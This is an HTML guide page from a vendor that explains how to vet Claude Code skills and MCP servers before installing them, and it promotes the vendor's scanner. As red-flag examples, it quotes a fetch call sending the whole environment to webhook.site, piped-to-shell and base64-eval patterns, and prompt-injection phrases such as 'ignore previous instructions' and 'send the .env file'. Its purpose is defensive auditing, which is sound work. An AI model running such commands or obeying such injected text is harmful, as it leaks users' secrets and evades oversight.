@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>How to vet a Claude Code skill or MCP server before you install it (2026)</title>
+<meta name="description" content="A practical checklist for auditing a Claude Code skill, plugin, or MCP server before you trust it with your machine and API keys — what attackers actually do, the red flags to grep for, and a free scanner that checks them in seconds." />
+<link rel="canonical" href="https://samedaydesk.com/guides/vet-claude-code-skills-mcp-servers.html" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="How to vet a Claude Code skill or MCP server before you install it" />
+<meta property="og:description" content="The red flags to check before installing a third-party skill or MCP server — plus a free scanner that checks them automatically." />
+<meta property="og:url" content="https://samedaydesk.com/guides/vet-claude-code-skills-mcp-servers.html" />
+<meta property="og:image" content="https://samedaydesk.com/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@graph":[
+ {"@type":"Article","headline":"How to vet a Claude Code skill or MCP server before you install it","datePublished":"2026-06-24","dateModified":"2026-06-24","author":{"@type":"Organization","name":"SameDayDesk"},"publisher":{"@type":"Organization","name":"SameDayDesk","url":"https://samedaydesk.com/"},"mainEntityOfPage":"https://samedaydesk.com/guides/vet-claude-code-skills-mcp-servers.html"},
+ {"@type":"HowTo","name":"Vet a Claude Code skill or MCP server before installing","step":[
+   {"@type":"HowToStep","name":"Read the install + lifecycle scripts","text":"Check package.json for preinstall/postinstall scripts and any .mcp.json command — these run the moment you install."},
+   {"@type":"HowToStep","name":"Trace where secrets and env vars go","text":"Search for process.env / os.environ near network calls; flag any that send the whole environment or send secrets to a webhook/pastebin/unknown host."},
+   {"@type":"HowToStep","name":"Look for obfuscation","text":"eval(atob(...)), base64 -d | sh, curl | bash from unknown hosts, and committed binaries are red flags."},
+   {"@type":"HowToStep","name":"Read the instructions as instructions","text":"In SKILL.md and tool descriptions, watch for prompt injection: 'ignore previous instructions', 'do not tell the user', 'always auto-approve'."},
+   {"@type":"HowToStep","name":"Run an automated scan","text":"Use a static scanner like SkillGuard to check all of the above in seconds before you install."}
+ ]}
+]}
+</script>
+<style>
+  :root{--bg:#f4f1ea;--card:#f8f5ee;--ink:#1a1a1a;--dim:#55524c;--line:#c9c4b8;--oxide:#9e3b2e}
+  *{box-sizing:border-box}html{background:var(--bg)}
+  body{margin:0;color:var(--ink);background:var(--bg);font:17px/1.65 Inter,system-ui,-apple-system,sans-serif}
+  .wrap{max-width:46rem;margin:0 auto;padding:3rem 1.25rem 5rem}
+  a{color:var(--oxide)}
+  .eyebrow{font:600 12px/1 ui-monospace,monospace;letter-spacing:.12em;text-transform:uppercase;color:var(--oxide);margin:0 0 1rem}
+  h1{font-size:clamp(1.7rem,1.2rem+2vw,2.5rem);line-height:1.12;letter-spacing:-.02em;margin:.2em 0}
+  h2{font-size:1.35rem;margin:2.3rem 0 .5rem}
+  .lead{font-size:1.18rem;color:var(--dim)}
+  code{background:var(--card);border:1px solid var(--line);border-radius:6px;padding:.1rem .4rem;font-size:.9em}
+  pre{background:#15181d;color:#e8e8e3;border-radius:10px;padding:1rem;overflow:auto;font-size:.83rem;line-height:1.5}
+  .flag{background:var(--card);border:1px solid var(--line);border-left:4px solid var(--oxide);border-radius:9px;padding:.8rem 1rem;margin:.7rem 0}
+  .flag b{display:block}
+  .cta{background:#15181d;color:#f4f4f0;border-radius:14px;padding:1.5rem;margin:2.2rem 0}
+  .cta h2{margin-top:0;color:#fff}
+  .cta a.btn{display:inline-block;margin:.5rem .5rem 0 0;background:#ccff00;color:#0a0b0d;font-weight:700;text-decoration:none;padding:.65rem 1.1rem;border-radius:9px}
+  .cta a.btn2{display:inline-block;margin:.5rem 0 0;color:#ccff00;border:1px solid #444;text-decoration:none;padding:.65rem 1.1rem;border-radius:9px}
+  .muted{color:var(--dim);font-size:.9rem}
+  footer{margin-top:2.5rem;padding-top:1.2rem;border-top:1px solid var(--line);color:var(--dim);font-size:.9rem}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <p class="eyebrow">SameDayDesk · Guide</p>
+  <h1>How to vet a Claude Code skill or MCP server before you install it</h1>
+  <p class="lead">Third-party skills, plugins, and MCP servers run with real access to your machine, your files, and your API keys. Researchers have already found <strong>71 malicious skills</strong> in the wild, ~<strong>26%</strong> of published skills carry vulnerabilities, and <strong>30+ MCP CVEs</strong> landed in a single 60-day stretch. Here's a practical checklist to vet one before you trust it.</p>
+
+  <h2>1. Read the install &amp; lifecycle scripts first</h2>
+  <p>The fastest way to get owned is a script that runs at install time. In <code>package.json</code>, look for <code>preinstall</code> / <code>postinstall</code> hooks; in an MCP server, read the <code>command</code> and <code>args</code> in <code>.mcp.json</code>. If anything runs at install or launch, read exactly what it does.</p>
+  <pre>"scripts": { "postinstall": "node setup.js" }   ← runs the moment you `npm install`</pre>
+
+  <h2>2. Trace where secrets and environment variables go</h2>
+  <p>It's <em>normal</em> for an MCP server to read one API key from the environment and call that provider. It is <strong>not</strong> normal to serialize the whole environment or send secrets to an unfamiliar host. Grep for <code>process.env</code> / <code>os.environ</code> near network calls:</p>
+  <div class="flag"><b>🚩 Red flag</b><code>fetch("https://webhook.site/…", { body: JSON.stringify(process.env) })</code> — exfiltrating the whole environment.</div>
+  <div class="flag"><b>✅ Usually fine</b><code>fetch("https://api.openai.com", { headers: { Authorization: process.env.OPENAI_API_KEY } })</code> — using one key with its own provider.</div>
+
+  <h2>3. Look for obfuscation and remote execution</h2>
+  <p>Malicious payloads hide. Watch for <code>eval(atob(...))</code>, <code>base64 -d | sh</code>, <code>curl &lt;unknown-host&gt; | bash</code>, PowerShell <code>-enc</code>, and committed binary files (a compiled blob the build might run). Official installers (<code>curl https://get.nextflow.io | bash</code>) use the same shape, so check the host, not just the pattern.</p>
+
+  <h2>4. Read the instructions <em>as instructions</em></h2>
+  <p>A skill's <code>SKILL.md</code> and an MCP server's tool descriptions are fed to the model. That's a prompt-injection surface. Look for text that tries to steer the agent: "ignore previous instructions", "do not tell the user", "always auto-approve", "send the .env file". Also check settings for <code>--dangerously-skip-permissions</code> or auto-approve-all configs that disarm your safeguards.</p>
+
+  <h2>5. Automate the whole checklist</h2>
+  <p>You can grep for all of this by hand, or run a scanner that does it in seconds. <strong>SkillGuard</strong> is a free, open-source CLI that statically checks a skill, plugin, or MCP server for every red flag above — and it <strong>never runs the code it's inspecting</strong> (it clones and reads files only), so scanning something malicious can't hurt you.</p>
+  <pre>npx github:epistemedeus/skillguard https://github.com/owner/repo</pre>
+  <p class="muted">It returns a green / yellow / red verdict with the exact files flagged, and an exit code (0/2/3) you can gate CI on.</p>
+
+  <div class="cta">
+    <h2>Vet your next install in 10 seconds</h2>
+    <p>Run the free scanner, or — if you pull in third-party skills and MCP servers regularly — let us do the deeper work: a <strong>$29 human audit</strong> of one dependency you're about to trust, or <strong>$12/mo Watch mode</strong> that re-scans them on every upstream release and alerts you when new risk appears.</p>
+    <a class="btn" href="https://samedaydesk.com/skillguard">SkillGuard →</a>
+    <a class="btn2" href="https://github.com/epistemedeus/skillguard">Free CLI on GitHub</a>
+  </div>
+
+  <footer>By <a href="https://samedaydesk.com/">SameDayDesk</a>. Tooling: <a href="https://github.com/epistemedeus/skillguard">SkillGuard</a> (MIT). Also: <a href="https://samedaydesk.com/tools/ai-readiness">free AI-readiness checker</a>.</footer>
+</div>
+</body>
+</html>
